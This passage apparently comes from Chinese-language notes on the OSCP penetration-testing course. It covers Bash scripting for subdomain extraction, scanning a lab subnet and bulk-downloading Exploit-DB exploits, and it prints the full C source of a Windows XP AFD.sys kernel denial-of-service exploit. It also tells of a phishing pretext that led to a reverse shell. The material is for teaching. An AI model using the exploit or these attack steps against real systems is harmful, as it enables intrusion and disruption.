Repair</a></li>\nmail2.megacorpone.com/smtp/relay/\">Nanomite Based Weaponry Systems</a></li>\nsiem.megacorpone.com/home/\">Nanoprobe Based Entity Assimilation</a></li>\nsupport.megacorpone.com/ticket/requests/index.html\">Nanoprocessors</a></li>\nsyslog.megacorpone.com/logs/sys/view.php\">Perlin VanHook Chemical Dispersal</a></li>\ntest.megacorpone.com/demo/index.php\">What are the ethics behind MegaCorp One?</a></li>\nvpn.megacorpone.com/diffie-hellman/\">Is MegaCorp One being regulated by any goverment?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">Is there any environmental concerns related to nanotechnology?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">Can I suggest nanotechnology uses for the company to explore?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">What are the specs behind MegaCorpOne nanoprocessors?</a></li>\nadmin.megacorpone.com/news/today.php\">MegaCorp One acquires new round of funding.</a></p>\nbeta.megacorpone.com/util/files/news.html\">Lawsuit against MegaCorp One is dropped when plaintiffs go missing.</a></p>\nbeta.megacorpone.com/util/files/news.html\">MegaCorp One CEO Joe Sheer nominated for Nobel Physics, Medicine, and Literature prizes.</a></p>\n```\n\n在我们的输出中，每一行的开头都表明我们在正确的轨道上。现在，我们可以用剪切法将分隔符设置为 “/”（用 -d），并打印第一个字段（用 -f 1），只留下完整的子域名称。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep \"href=\" index.html | grep \"\\\\.megacorpone\" | grep -v \"www\\\\.megacorpone\\\\.com\" | awk -F \"http://\" '{print $2}'|cut -d \"/\" -f 1\nsupport.megacorpone.com\">SUPPORT<\nintranet.megacorpone.com\">LOG IN<\n\nadmin.megacorpone.com\nintranet.megacorpone.com\nmail.megacorpone.com\nmail2.megacorpone.com\nsiem.megacorpone.com\nsupport.megacorpone.com\nsyslog.megacorpone.com\ntest.megacorpone.com\nvpn.megacorpone.com\nwww2.megacorpone.com\nwww2.megacorpone.com\nwww2.megacorpone.com\nadmin.megacorpone.com\nbeta.megacorpone.com\nbeta.megacorpone.com\n```\n\n这看起来很好！然而，任何 Bash 大师看一眼我们的工作就会嗤之以鼻。那是应该的，因为我们以一种笨拙的方式使用了基本的工具，尽管我们的削减是相当合理的。Bash 及其相关的命令和内置程序是相当强大的，而且总是有更多的东西需要学习。\n\n如果我们对自己的工作进行批评，以努力改进（我们应该一直这样做），我们可能会看到一些简单的改进方法。首先，我们用 “href=” 开始搜索，后来又搜索了 http://。这两者本质上都是连接，但这要求每一行都有这两个字符串。如果某一行只有 http://，而没有 “herf=”，我们就会错过一行。应该避免冗余，特别是在处理大文件的时候。此外，我们并不真正关心链接，必然的，我们正在寻找以 “.megacorpone.com” 结尾的子域，而不管这个引用是否包含在一个链接中。\n\n另一件需要考虑的事情是，我们花了大量的时间和精力在搜索结果中寻找和分割出子域名称。这很笨拙，容易出错，而且毫无意义，因为形势良好的正则表达式搜索可以轻松处理这个问题。我们以前提到过正则表达式的为例，但是现在让我们看一个实际的例子，我们已经采取了解决这个问题的艰难途径。\n\n在这个例子中，我们将使用一个简单的正则表达式将 “.megacorpone.com” 子域从我们的文件中分割出来。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep -o '[^/]*\\\\.megacorpone\\\\.com' index.html | sort -u > list.txt\n                                                                                     \n┌──(root💀kali)-[~/Desktop]\n└─# cat list.txt                                                     \nadmin.megacorpone.com\nbeta.megacorpone.com\nintranet.megacorpone.com\nmail2.megacorpone.com\nmail.megacorpone.com\nsiem.megacorpone.com\nsupport.megacorpone.com\nsyslog.megacorpone.com\ntest.megacorpone.com\nvpn.megacorpone.com\nwww2.megacorpone.com\nwww.megacorpone.com\n```\n\n这个解决方案相当紧凑，但引入了一些新技术。首先，注意 `grep -o` 选项，它只返回我们正则表达式中定义的字符串。如果我们仔细的形成我们的表达式，这个单一的命令将处理我们之前的大部分数据雕刻。表达式本身看起来很复杂，但其实是相当直接的。\n\n我们要搜索的字符串 (’[^/]*.megacorpone.com’) 被包裹在单引号中，正如我们所提到的，单引号不允许变量扩展，并且会按字面意思处理所有被包围的字符。\n\n表达式中的第一个区块 ([^/]*) 是一个否定的 (^) 集合 ([])，它搜索不包括正斜杠的任何数量的字符 (*)。注意，句号用反斜杠 (\\.)转义的，以加强我们正在寻找一个字面的句号。接下来，该字符串必须以 “.megacorpone.com” 结束。当 grep 找到一个匹配的字符串时，它将把它从这一行中分割出来并返回。\n\n为了以后的使用，我们可以通过将其他字符包括在一个以逗号为限的列表中来否定列表。例如，这个块 ([^/,”]*) 将排除正斜杠和双引号字符。\n\n这是很多新的材料，可能看起来让人不知所措，但这是一个伟大的可重复使用的正则表达式，它可以找到任何在正斜杠之后以 “.megacorpone.com” 结尾的字符串，并尽职尽责的将 URL 引用的子域划出。我们以后可以重复使用这个正则表达式，从一个文件中分割出任何数量的字符串。\n\n我们本可以用这个正则表达式做得更多，但这是一个很好的开始，也是一个很好的例子，说明为什么正则表达式是如此有价值。\n\n现在我们有一个漂亮的、干净的、从 [megacorpone.com](http://megacorpone.com) 的首页链接的域名列表。接下来，我们将使用 host 来发现我们文本文件中每个域名的对应 IP 地址。我们可以用一个 Bash 单行循环来完成这个任务。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# for url in $(cat list.txt); do host $url; done\nadmin.megacorpone.com has address 51.222.169.208\nbeta.megacorpone.com has address 51.222.169.209\nintranet.megacorpone.com has address 51.222.169.211\nmail2.megacorpone.com has address 51.222.169.213\nmail.megacorpone.com has address 51.222.169.212\nsiem.megacorpone.com has address 51.222.169.215\nsupport.megacorpone.com has address 51.222.169.218\nsyslog.megacorpone.com has address 51.222.169.217\ntest.megacorpone.com has address 51.222.169.219\nvpn.megacorpone.com has address 51.222.169.220\nwww2.megacorpone.com has address 149.56.244.87\nwww.megacorpone.com has address 149.56.244.87\n```\n\nhost 命令给了我们各种各样的输出，但并非所有的输出都是相关的。我们将通过管道符将输出结果输入“有地址”的 grep 来提取 IP 地址，然后对结果进行 cut 和 sort。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# for url in $(cat list.txt); do host $url; done | grep \"has address\" | cut -d \" \" -f 4 | sort -u\n149.56.244.87\n51.222.169.208\n51.222.169.209\n51.222.169.211\n51.222.169.212\n51.222.169.213\n51.222.169.215\n51.222.169.217\n51.222.169.218\n51.222.169.219\n51.222.169.220\n```\n\n很好，我们已经从网页中提取了 “.megacorpone.com” 子域，并获得了相应的 IP 地址。正如我们所看到的，我们可以用 Bash 和相关的工具以及正则表达式来处理数据，这加强了一个事实：任何花在深入研究这些主题上的时间都会在未来节省大量的处理数据或加速进程的时间。\n\n### Bash 的实际使用 —— 例子 2\n\n在这个例子中，让我们假设我们正在进行渗透测试，并且拥有对一台 Windows 机器的非特权访问权。当我们继续收集信息时，我们意识到这台机器可能会被一个我们读到的以字母 a、f 和 d 开头的漏洞所攻击，但我们不记得这个漏洞的全名。为了提升我们的权限，我们想搜索那个特定的漏洞。\n\n要做到这一点，我们将需要在 [https://exploit-db.com](https://exploit-db.com，)，搜索 “afd windwos” 下载符合我们搜索条件的漏洞，并检查它们，直到我们找到合适的漏洞。我们可以通过网站手动完成，这不会花太多时间，但如果我们花时间写一个 Bash 脚本，我们很容易地用它来搜索并在以后自动下载漏洞。\n\n利用我们现在对脚本的了解，让我们试着将这项任务自动化。\n\n我们将从 Kali Linux 上的 Searchsploit 工具开始。Searchsploit 是 Exploit-DB 的一个命令行搜索工具，它允许我们无论走到哪里都能带着 Exploit 数据库的离线拷贝。我们将传递 “afd windows” 作为搜索字符串，使用 `-w` 来返回 https://www.exploit-db.com，而不是本地路径，以及 `-t` 来搜索漏洞标题。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit afd windows -w -t\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\n Exploit Title                                                                                                                                                         |  URL\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\nMicrosoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                                                                                              | <https://www.exploit-db.com/exploits/40564>\nMicrosoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                                                                                                            | <https://www.exploit-db.com/exploits/18755>\nMicrosoft Windows - 'AfdJoinLeaf' Local Privilege Escalation (MS11-080) (Metasploit)                                                                                   | <https://www.exploit-db.com/exploits/21844>\nMicrosoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040)                                                                                 | <https://www.exploit-db.com/exploits/39525>\nMicrosoft Windows 7 (x86) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040)                                                                                 | <https://www.exploit-db.com/exploits/39446>\nMicrosoft Windows 7 Kernel - Pool-Based Out-of-Bounds Reads Due to bind() Implementation Bugs in afd.sys / tcpip.sys                                                   | <https://www.exploit-db.com/exploits/42009>\nMicrosoft Windows XP - 'afd.sys' Local Kernel Denial of Service                                                                                                        | <https://www.exploit-db.com/exploits/17133>\nMicrosoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin) (MS08-066)                                                                                 | <https://www.exploit-db.com/exploits/6757>\nMicrosoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080)                                                                                            | <https://www.exploit-db.com/exploits/18176>\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\nShellcodes: No Results\n```\n\n这是一个好的开始，但我们需要对结果进行修饰。现在，我们只对该漏洞的 URL 感兴趣，所以让我们搜索 “http”，然后剪切我们需要的内容。我们将使用一个 “|” 字符分隔符，并提取第二个字段。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit afd windows -w -t|grep http|cut -f 2 -d \"|\"\n <https://www.exploit-db.com/exploits/40564>\n <https://www.exploit-db.com/exploits/18755>\n <https://www.exploit-db.com/exploits/21844>\n <https://www.exploit-db.com/exploits/39525>\n <https://www.exploit-db.com/exploits/39446>\n <https://www.exploit-db.com/exploits/42009>\n <https://www.exploit-db.com/exploits/17133>\n <https://www.exploit-db.com/exploits/6757>\n <https://www.exploit-db.com/exploits/18176>\n```\n\n这看起来好一点。我们现在有了每个漏洞的 URL，我们可以使用 Bash 循环来下载并保存在本地。然而，在我们这样做之前，我们注意到每个页面都有一个下载“原始”漏洞代码的链接，这才是我们真正想要的东西。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e846046b-1782-4e71-8114-f2bbf84b426b/Untitled.png)\n\n我们看到，每个原始页面（如 /exploits/40564）都链接到一个原始漏洞（如 /raw/40564）。有了这些信息，我们运行 sed (sed ‘s/exploits/raw/’) 来修改下载 URL，并将其插入 Bash 单行程序，以下载漏洞的原始代码。\n\n```bash\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d \"|\"); do exp_name=$(echo $e | cut -d \"/\" -f 5) && url=$(echo $e | sed 's/exploits/raw/') && wget -q --no-check-certificate $url -O $exp_name; done\n```\n\n请注意，我们使用了一个 for 循环来迭代我们抓取的 Searchsploit URL。在这个循环中，我们将 exp_name 设置为漏洞的“名称”（使用 grep、cut 和命令替换），将 url 设置为原始下载位置（同样使用 sed 和命令替换）。如果成功了（&&），我们使用 wget 抓取漏洞（在安静模式下，没有证书检查），将其保存在本地，漏洞名称为本地文件名。\n\n一旦我们运行它，我们就等待命令提示，并验证漏洞确实被下载了，使用文件来验证文件时文本。\n\n```bash\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# ls -l           \n总用量 120\n-rw-r--r-- 1 root root  1363  3月 30 04:01 17133\n-rw-r--r-- 1 root root 12215  3月 30 04:01 18176\n-rw-r--r-- 1 root root  9698  3月 30 04:00 18755\n-rw-r--r-- 1 root root 11590  3月 30 04:00 21844\n-rw-r--r-- 1 root root 10575  3月 30 04:00 39446\n-rw-r--r-- 1 root root 14193  3月 30 04:00 39525\n-rw-r--r-- 1 root root 32674  3月 30 04:00 40564\n-rw-r--r-- 1 root root 12636  3月 30 04:00 42009\n-rw-r--r-- 1 root root   612  3月 30 04:01 6757\n\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# file 17133                     \n17133: C source, ASCII text, with CRLF line terminators\n```\n\n我们可以检查每个漏洞，并看到我们确实抓住了原始漏洞：\n\n```bash\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# cat 17133\n////////////////////////////////////////////////////////////////////////////\n//\n// Title: Microsoft Windows xp AFD.sys Local Kernel DoS Exploit\n// Author: Lufeng Li of Neusoft Corporation\n// Vendor: www.microsoft.com\n// Vulnerable: Windows xp sp3\n//\n/////////////////////////////////////////////////////////////////////////////\n\n#include <stdio.h>\n#include <Winsock2.h>\n\n#pragma comment (lib, \"ws2_32.lib\")\n\nBYTE buf[]={\n0xac,0xfd,0xd3,0x00,0x01,0x00,0x00,0x00,0x00,0x00,\n0x00,0x00,0x20,0x00,0x00,0x00,0xe8,0xfd,0xd3,0x00,\n0xb8,0xfd,0xd3,0x00,0xf8,0xfd,0xd3,0x00,0xc4,0xfd,\n0xd3,0x00,0xcc,0xfd,0xd3,0x00};\n\nint main( )\n{\n    WSADATA ws;\n\n    SOCKET tcp_socket;\n    struct sockaddr_in peer;\n        ULONG  dwReturnSize;\n\n        printf(\"\\\\n Microsoft Windows xp AFD.sys Local Kernel DoS Exploit \\\\n\\\\n\");\n        printf(\"\\\\t Create by Lufeng Li of Neusoft Corporation. \\\\n\\\\n\");\n\n    WSAStartup(0x0202,&ws);\n\n    peer.sin_family = AF_INET;\n    peer.sin_port = htons( 0x01bd );\n    peer.sin_addr.s_addr = inet_addr( \"127.0.0.1\" );\n\n    tcp_socket = socket(AF_INET, SOCK_DGRAM, 0);//SOCK_DGRAM\n\n        if ( connect(tcp_socket, (struct sockaddr*) &peer, sizeof(struct sockaddr_in)) )\n    {\n                printf(\"connect error\\\\n\");\n        exit(0);\n    }\n\n        DeviceIoControl( (HANDLE)tcp_socket,0x000120cf, buf,0x24,buf,0x24,&dwReturnSize, NULL);\n\n    return TRUE;\n}\n```\n\n尽管我们用 Bash 单行程序取得了成功，但我们的代码并不是很干净，而且也不是特别容易重复使用。让我们把所有东西放在一个 Bash 脚本中来解决这些问题。\n\n```bash\nkali@kali:~$ cat dlsploits.sh\n#!/bin/bash\n# Bash script to search for a given exploit and download all matches.\n\nfor e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d \"|\")\n\ndo\n exp_name=$(echo $e | cut -d \"/\" -f 5)\n url=$(echo $e | sed 's/exploits/raw/')\n wget -q --no-check-certificate $url -O $exp_name\ndone\n\nkali@kali:~$ chmod +x ./dlsploits.sh\n\nkali@kali:~$ ./dlsploits.sh\n```\n\n我们现在可以手动检查漏洞，找到我们感兴趣的漏洞，在测试机器上试一试，最后在目标上运行适当的漏洞，因为在活的目标上随机利用漏洞是不好的形式，是完全灾难的秘诀。\n\n### Bash 的实际使用 —— 例子 3\n\n作为渗透测试人员，我们一直在努力寻找效率，以减少我们分析数据的时间，特别是在各种扫描中恢复的数据量。\n\n让我们假设我们的任务是扫描一个 C 类子网，以识别网络服务器并确定它们是否呈现出有趣的攻击面。端口扫描是检查远程机器上的 TCP 或 UDP 端口的过程，目的是检查目标机器上有哪些服务器在运行，可能存在哪些攻击载体。我们将在另一个模块中更详细地讨论端口扫描，但现在，让我们保持一般性，因为这是一个很好的例子，说明 Bash 脚本可以自动完成一项相当乏味的任务。\n\n为了实现我们的目标，我们首先会对整个子网进行端口扫描，以确定潜在的开放网络服务，然后我们可以手动浏览它们的网页。\n\n首先，让我们创建一个临时文件夹，用于这个练习。\n\n```bash\nkali@kali:~$ mkdir temp\n\nkali@kali:~$ cd temp/\n```\n\n现在我们已经创建了这个目录，并且用 cd 进入了这个目录，让我们进入更有趣的部分，对 C 类子网进行扫描。我们将只关注 80 端口，以保持一定的可管理性，我们将使用 nmap（我们在后面的模块中讨论）作为我们的端口扫描工具。\n\n```bash\nkali@kali:~/temp$ sudo nmap -A -p80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-254\nStarting Nmap 7.60 ( <https://nmap.org> ) at 2019-03-18 18:57 EDT\nNmap scan report for 10.11.1.8\nHost is up (0.030s latency).2\n\nPORT STATE SERVICE VERSION\n80/tcp open http Apache httpd 2.0.52 ((CentOS))\n| http-methods:\n|_ Potentially risky methods: TRACE\n| http-robots.txt: 2 disallowed entries\n|_/internal/ /tmp/\n|_http-server-header: Apache/2.0.52 (CentOS)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nMAC Address: 00:50:56:89:20:34 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open an\nDevice type: general purpose|WAP|firewall|proxy server|PBX\nRunning (JUST GUESSING): Linux 2.6.X (92%), ZoneAlarm embedded (90%), Cisco embedded\nAggressive OS guesses: Linux 2.6.18 (92%), Linux 2.6.9 (92%), Linux 2.6.9 - 2.6.27 (90\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT ADDRESS\n1 30.19 ms 10.11.1.8\n\nNmap scan report for 10.11.1.10\nHost is up (0.030s latency).\n\nPORT STATE SERVICE VERSION\n80/tcp open http Microsoft IIS httpd 6.0\n| http-methods:\n|_ Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\nMAC Address: 00:50:56:89:06:D0 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open an\nDevice type: general purpose|WAP\nRunning (JUST GUESSING): Microsoft Windows 2003|XP|2000 (89%), Apple embedded (86%)\nOS CPE: cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE\nHOP RTT ADDRESS\n1 30.41 ms 10.11.1.10\n...\n```\n\n这是一个非常直接的扫描， `-A` 表示积极的扫描， `-p` 指定端口或端口范围， `-open` 只返回有开放端口的机器， `-oG` 以 greppable 格式保存扫描结果。再说一遍，如果 nmap 对你来说是陌生的，不要着急。我们将在后面讨论细节，但 nmap 肯定提供了相当数量的输出来工作。\n\n让我们 cat 输出文件来熟悉它的格式。\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254\n# Nmap 7.60 scan initiated Sun Mar 18 18:57:48 2019 as: nmap -A -p80 --open -oG nmapscan_10.11.1.1-254 10.11.1.0/24\nHost: 10.11.1.8 () Status: Up\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Status: Up\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Status: Up\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\n有趣的是，每个 IP 地址重复了两次，第一行显示机器状态，第二行显示被扫描的端口号。由于我们只对唯一的 IP 地址感兴趣，所以有必要进行一些清理。让我们多包含端口 80 的行进行 grep。\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80\n# Nmap 7.60 scan initiated Sun Mar 18 18:57:48 2019 as: nmap -A -p80 --open -oG nmapscan_10.11.1.1-254 10.11.1.0/24\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\n这是一个很好的开始，但注意到第一行是不相关的。为了排除它，我们将用 `-v` 再次 grep，这是一个 “反向 grep”，只显示不匹配搜索字符串的行。在这个例子中，我们不想要任何包含大小写关键词 “Nmap” 的行。\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\"\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\n我们的输出看起来好多了。让我们试着只提取 IP 地址，因为这就是我们真正感兴趣的东西。为此，我们将使用 awk 来打印第二个字段，用 `Space` 作为分隔符。\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\" | awk '{print\n$2}'\n10.11.1.8\n10.11.1.10\n10.11.1.13\n10.11.1.14\n10.11.1.22\n10.11.1.24\n10.11.1.31\n10.11.1.39\n10.11.1.49\n10.11.1.50\n10.11.1.71\n...\n```\n\n很好。这看起来是一个干净的 IP 地址列表。下一步，我们将使用 Bash 单行程序来循环浏览上面的 IP 列表，并运行 `cutycapt`，这是一个 Qt WebKit 网页渲染捕捉工具。我们将使用 `-url` 来指定目标网站，使用 `-out` 来指定输出文件的名称。\n\n```bash\nkali@kali:~/temp$ for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done\n```\n\n一旦我们的循环结束并有了提示，我们就可以用 ls 的 `-l` 选项检查由我们的 Bash 单行程序创建的输出文件的列表，它每行列出一个文件，抑制了其他细节。\n\n```bash\nkali@kali:~/temp$ ls -1 *.png\n10.11.1.10.png\n10.11.1.115.png\n10.11.1.116.png\n10.11.1.128.png\n10.11.1.13.png\n10.11.1.133.png\n10.11.1.14.png\n10.11.1.202.png\n10.11.1.209.png\n10.11.1.217.png\n...\n```\n\n完美。我们正越来越接近我们的目标，我们可以单独检查这些文件，但更有吸引力的选择是再次将我们的脚本只是用于工作，看看是否还有其他可以自动化的东西。这不仅需要 Bash 脚本技能，还需要基本的 HTML 知识。\n\n```bash\nkali@kali:~/temp$ cat ./pngtohtml.sh\n#!/bin/bash\n# Bash script to examine the scan results through HTML.\n\necho \"<HTML><BODY><BR>\" > web.html\n\nls -1 *.png | awk -F : '{ print $1\":\\\\n<BR><IMG SRC=\\\\\"\"$1\"\"$2\"\\\\\" width=600><BR>\"}' >>\nweb.html\n\necho \"</BODY></HTML>\" >> web.html\n\nkali@kali:~/temp$ chmod +x ./pngtohtml.sh\n\nkali@kali:~/temp$ ./pngtohtml.sh\n\nkali@kali:~/temp$ firefox web.html\n```\n\n这脚本建立了一个 HTML 文件（web.html），从最基本的标签开始。然后，ls 和 awk 语句将每个  `.PNG` 文件名插入一个 HTML IMG 标签，将其追加到我们的 web.html 文件。最后，我们将 HTML 结束标签附加到文本中，使脚本可执行，并在浏览器中查看。结果很简单，但很有效，让我们看到了每个网络服务器的主页面。\n\n希望这些简短的实际例子能让你了解到 Bash 脚本所能提供的一些可能性。当试图在评估过程中快速实现大量任务的自动化时，学会有效使用 Bash 将是至关重要的。\n\n### 练习\n\n1. 研究 Bash 循环并编写一个简短的脚本，对你的目标 IP 范围 10.11.1.0/24 进行 ping 扫频。\n2. 尝试用更高级的脚本语言，如 Python、Prel 或 Ruby，来完成上述练习。\n3. 使用本模块中的实际例子来帮助你创建一个 Bash 脚本，从 access_log.txt 文件中提取 JavaScript 文件（http://www.offensive-security.com/pwkfiles/access_log.txt.gz）。确保文件名不包括路径，并且是排序的。\n4. 用另一种语言，如Python、Prel 或 Ruby，重新编写前面的练习。\n\n# 被动的信息收集\n\n被动信息收集（也称开源情报或 OSINT）是收集有关目标的公开信息的过程通常不与该目标有任何直接互动。\n\n我们可以利用各种资源和工具来收集这些信息，这个过程是循环的而不是线性的。换句话说，这个过程的任何阶段的“下一步”都取决于我们在以前的步骤中所发现的东西，从而形成过程的“循环”。由于每个工具或资源可以产生任何数量的不同结果，因此很难定义一个标准化的过程。被动信息收集的最终目标是获得澄清或扩大攻击面的信息，帮助我们成功的网络钓鱼活动，或补充其他渗透测试步骤，如密码猜测。\n\n由于这一过程的循环性质，本模块的展开方式将与之前的模块不同。我们将简单地介绍各种资源和工具，解释它们是如何工作的，并用建立一个被动的信息收集活动所需的基本技术来武装你，而不是提出有联系的场景。\n\n在开始之前，我们需要定义被动信息收集。关于在这种情况下什么是“被动”，有两个不同的流派。\n\n在最严格的解释中，我们从不与目标直接沟通。例如，我们可以依靠第三方获取信息，但我们不会访问目标的任何系统或服务器。\n\n使用这种方式可以对我们的行动和意图保持高度的保密性，但也可能是麻烦的，并可能限制我们的结果。\n\n在一个较宽松的解释中，我们可能与目标进行互动，但只是像一个正常的互联网用户那样。例如，如果目标网站允许我们注册一个账户，我们可以这样做。然而，在这个阶段，我们不会测试网站的漏洞。\n\n在本模块中，我们将对我们的方法采用后一种不太严格的解释。这两种方法都不一定“正确”。在决定使用哪种方法之前，我们需要考虑渗透测试的范围与参与规则。此外，请记住这个阶段可能并不总是必要的，即使这个阶段取得了成果（例如以成功的鱼叉网络钓鱼活动的形势），其他阶段可能需要同等或更大的关注。\n\n在我们开始讨论资源和工具之前，让我们分享一个渗透测试的个人例子，其中涉及被动信息收集活动的成功要素。\n\n**作者的说明**\n\n几年前，我们 Offensive Security 公司的任务是为一家小公司进行渗透测试。这家公司几乎没有互联网的存在，只有很少的外部暴露服务，所有这些都被证明是安全的。实际上，没有任何攻击面可言。经过集中的被动信息收集活动，利用各种谷歌搜索运营商，连接到其他在线工具的信息“管道”，以及一点创造性的逻辑思维，我们发现目标公司的一名员工在一个集邮论坛上发了一个帖子。\n\n```bash\nHi!\nI'm looking for rare stamps form the 1950's - for sale or trade.\nPlease contact me at david@company-address.com\nCell: 999-999-9999\n\n你好！\n我正在寻找 20 世纪 50 年代的稀有邮票 —— 用于出售或交易。\n请与我联系 david@company-address.com\n手机：999-999-9999\n```\n\n我们利用这些信息发起了一个半复杂的客户端攻击。我们迅速注册了一个与邮票有关的域名，并设计了一个登录页面，显示我们用谷歌图片找到的 50 年代的各种稀有邮票。这个域名和网站的设计无疑增加了我们的邮票交易网站的可感知的可靠性。\n\n接下来，我们在网站的网页上嵌入了一些讨厌的客户端攻击利用代码，并在工作日给 “大卫” 打电话。在电话中，我们假扮成一个继承了他们祖父的巨大邮票收藏的集邮者。\n\n大卫接到我们的电话后喜出望外，毫不犹豫地访问了这个恶意网站，查看“邮票收藏”。在浏览该网站时，漏洞代码在他的本地机器上执行，并向我们发送了一个反向 Shell。\n\n这是一个很好的例子，说明一些无害的被动信息收集的信息，如一个员工用他的公司邮箱从事个人业务，可以在渗透测试中导致一个立足点。有时，最小的细节可能是最重要的。\n\n<aside> 💡 虽然“大卫”没有遵循最佳实践，但正是该公司的政策和缺乏安全意识计划为这一漏洞创造了条件。正因为如此，我们避免在书面报告中把责任推给某个人。作为渗透测试人员，我们的目标是提高客户资源的安全性，而不是针对某一个员工。简单地删除“大卫”不会解决这个问题。\n\n</aside>\n\n让我们来看看一些最流行的工具和技术，它们可以帮助我们进行成功的信息收集活动。我们将使用MegaCorp One，一个由 Offensive Security 创建的虚构公司，作为我们活动的主题。\n\n## 记笔记\n\n一个信息收集活动可以产生大量的数据，我们必须很好地管理这些数据，这样我们就可以在进步的搜索中利用这些数据，或者在以后的阶段使用这些数据。做笔记的方法没有对错之分。然而，我们可能会发现，如果我们保持详细的、格式良好的笔记，以后检索信息会更容易。\n\n## 网站侦查\n\n如果客户有一个网站，我们可以通过简单的浏览网站来收集基本信息。小型组织可能只有一个网站，而大型组织可能有很多，包括一些没有维护的网站。让我们看看 MegaCorp One 的网站（https://www.megacorpone.com/），以了解更多关于我们的目标。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/83621e12-5d8e-40d4-9f1f-8e0519044d1e/Untitled.png)\n\n对其网站的快速审查显示，他们是一家纳米技术公司。\n\n在 https://www.megacorpone.com/about.html，关于页面显示了他们一些员工的电子邮件地址和 Twitter 账户。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/979b7304-c407-4e77-b20b-3168c39e311b/Untitled.png)\n\n我们可以在社会媒体的信息收集活动中使用这些地址。我们将在后面的章节中详细讨论这个问题。\n\n还值得一提的是，该公司的电子邮件地址格式遵循“首字母+姓氏”的模式。然而，他们的 CEO 的电子邮件仅仅使用了他的名字。这表明创始人或长期员工的电子邮件格式与新员工的不同。这一信息在以后的评估阶段可能会很有用。\n\n在同一页上发现的企业社交媒体账户，也值得记录，以便进一步研究。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1dce2389-4def-497c-91fd-870252c1ee6b/Untitled.png)\n\n让我们更新我们的笔记，以记录这些信息的每一点，包括电子邮件地址格式和社交媒体网站的参考。\n\n## Whois 枚举\n\nWhois 是一种 TCP 服务、工具和一种数据库，可以提供关于域名的信息，如名称服务器和注册商。这些信息通常是公开的，因为注册商对私人注册收取费用。\n\n我们可以通过将域名 [megacorpone.com](http://megacorpone.com/) 传入 whois 客户端，执行标准的前向搜索，来收集域名的基本信息。\n\n```bash\nkali@kali:~$ whois megacorpone.com\n Domain Name: MEGACORPONE.COM\n Registry Domain ID: 1775445745_DOMAIN_COM-VRSN\n Registrar WHOIS Server: whois.gandi.net\n Registrar URL: 